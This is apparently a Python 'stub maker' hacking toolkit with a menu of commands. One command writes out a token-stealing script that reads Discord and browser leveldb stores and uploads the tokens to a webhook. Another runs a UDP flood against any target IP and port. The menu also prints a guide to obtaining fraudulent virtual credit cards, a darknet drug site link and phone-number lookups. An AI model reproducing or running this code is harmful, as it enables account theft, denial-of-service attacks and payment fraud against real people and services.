import colorama, time, os, socket, webbrowser, random
import pywhatkit
from colorama import Fore, Back, Style

vcc = ("""
Service Text: How to make vcc - 

1.) Download oldubil app from play store
2.) Buy phonr number for register from https://5sim.net/ [ choose country russia ] 
3.) Open and register [ country russia ] 
4.) After register go to my wallet and check your card 

How to add funds? 

1.) Go to https://plati.market/ this website
2.) Login 
3.) Search oldubil
4.) Find cheapest seller and buy 
5.) After purchase you get a unique code at email copy it and go to plati market and go at chat and put your code and go to""")

mk = ('''
import requests
import json
import re
from dhooks import Webhook
import os
import httpx
import urlopen

grabtkn = True

hook=''

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if  file_name.endswith('.log') or file_name.endswith('.ldb'):
         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
        'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\'
    }

message = ''

for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f''
        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                headers = {
                "Authorization": token,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
                }
                try:
                  urlopen(request("https://discordapp.com/api/v6/users/@me", headers=headers))
                except:
                  pass
print("")
tokensss = ('tokensss.txt')
with open('tokensss.txt', 'w') as file:
    file.write(token)
if grabtkn == True:
    with open(tokensss, 'rb') as f:
        httpx.post(hook, files={'upload_file': f})
    os.remove(tokensss)''')

colorama.init()

def clear():
    os.system('cls' if os.name=='nt' else 'clear')

def STUB():
    print(Fore.BLUE + """
#########################################################
##  _  ____   ____   _______ _______   ___    _ __  __ ## 
## | |/ /\ \ / /\ \ / /  __ \_   _\ \ / / |  | |  \/  |##
## | ' /  \ V /  \ V /| |  | || |  \ V /| |  | | \  / |##
## |  <    > <    > < | |  | || |   > < | |  | | |\/| |##
## | . \  / . \  / . \| |__| || |_ / . \| |__| | |  | |##
## |_|\_\/_/ \_\/_/ \_\_____/_____/_/ \_\\____/ |_|  |_|##
##                                                     ##
#########################################################                                              
""")
    print(Fore.WHITE + "[" + Fore.GREEN + "STUB MAKER" + Fore.WHITE + "]" + Fore.BLUE + ": Command:  /info")
    print(Fore.WHITE + "[" + Fore.GREEN + "STUB MAKER" + Fore.WHITE + "]" + Fore.BLUE + ": Command:  /mk (makestub)")
    print(Fore.WHITE + "[" + Fore.GREEN + "STUB MAKER" + Fore.WHITE + "]" + Fore.BLUE + ": Command:  /sc (full fraud book)")
    print(Fore.WHITE + "[" + Fore.GREEN + "STUB MAKER" + Fore.WHITE + "]" + Fore.BLUE + ": Command:  /dd (darknet drug websites)")
    print(Fore.WHITE + "[" + Fore.GREEN + "STUB MAKER" + Fore.WHITE + "]" + Fore.BLUE + ": Command:  /ipweb (get ip of any website)")
    print(Fore.WHITE + "[" + Fore.GREEN + "STUB MAKER" + Fore.WHITE + "]" + Fore.BLUE + ": Command:  /vcc (unlimited turkish vccs)")
    print(Fore.WHITE + "[" + Fore.GREEN + "STUB MAKER" + Fore.WHITE + "]" + Fore.BLUE + ": Command:  /nl (number lookup)")
    print(Fore.WHITE + "[" + Fore.GREEN + "STUB MAKER" + Fore.WHITE + "]" + Fore.BLUE + ": Command:  /if (ip fucker)")
    drr = input('''
>> ''')


    if drr == ("/info"):
        
        print("""
######################################################################################
https://github.com/KADIUM1 // discord.gg/kadium // KADIUM#9999
######################################################################################
        
Enjoy: :)""")
        exit = input(Fore.RED + "Press Enter to go back...")
        clear()
        STUB()

    if drr == ("/mk"):
        with open('stub.txt', 'w') as file:
            file.write(mk)
            time.sleep(5)
            print(Fore.GREEN + "[ + ]" + Fore.WHITE + " Wrote the stub into stub.txt (make sure to replace your webhook)")
            exit = input(Fore.RED + "Press Enter to go back...")
            clear()
            STUB()

    if drr == ("/dd"):
        print(Fore.GREEN + "[ + ]" + Fore.BLUE + ":" + Fore.WHITE + " Websites found: https://daddysdrugs.onion")
        exit = input(Fore.RED + "Press Enter to go back...")
        clear()
        STUB()
    
    if drr == ("/ipweb"):
        clear()
        print(Fore.RED + "[ - ]: Currently not avabile")
        time.sleep(0.1)
        exit = input(Fore.RED + "Press Enter to go back...")
        clear()
        STUB()
    
    if drr == ("/vcc"):
        print(Fore.CYAN)
        clear()
        print(vcc)
        exit = input(Fore.RED + "Press Enter to go back...")
        clear()
        STUB()

    if drr == ("/nl"):
        clear()
        number = input("Number >> ")
        webbrowser.open("https://numbercalls.info.cutestat.com/" + number)
        print(Fore.GREEN + "[ + ]" + Fore.BLUE + ":" + Fore.WHITE + " Started Website")
        webbrowser.open("https://www.numberlookup.com.au/number/" + number)
        print(Fore.GREEN + "[ + ]" + Fore.BLUE + ":" + Fore.WHITE + " Started Website")
        webbrowser.open("https://who-called.co.uk/Number/" + number)
        print(Fore.GREEN + "[ + ]" + Fore.BLUE + ":" + Fore.WHITE + " Started Website")
        webbrowser.open("https://www.google.com/search=" + number)
        print(Fore.GREEN + "[ + ]" + Fore.BLUE + ":" + Fore.WHITE + " Started Website")
        exit = input(Fore.RED + "Press Enter to go back...")
        clear()
        STUB()

    if drr == ("/if"):
        clear()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
        ip = input("Enter Target IP: ")
        port = int(input("Enter Target Port: "))
        sleep = float(input("Sleep: "))
 
        s.connect((ip, port))
        while True:
            for i in range(1, 100**1000):
                s.send(random._urandom(10)*1000)
                print(f"Send: {i}", end='\r')
                time.sleep(sleep)
    
            
STUB()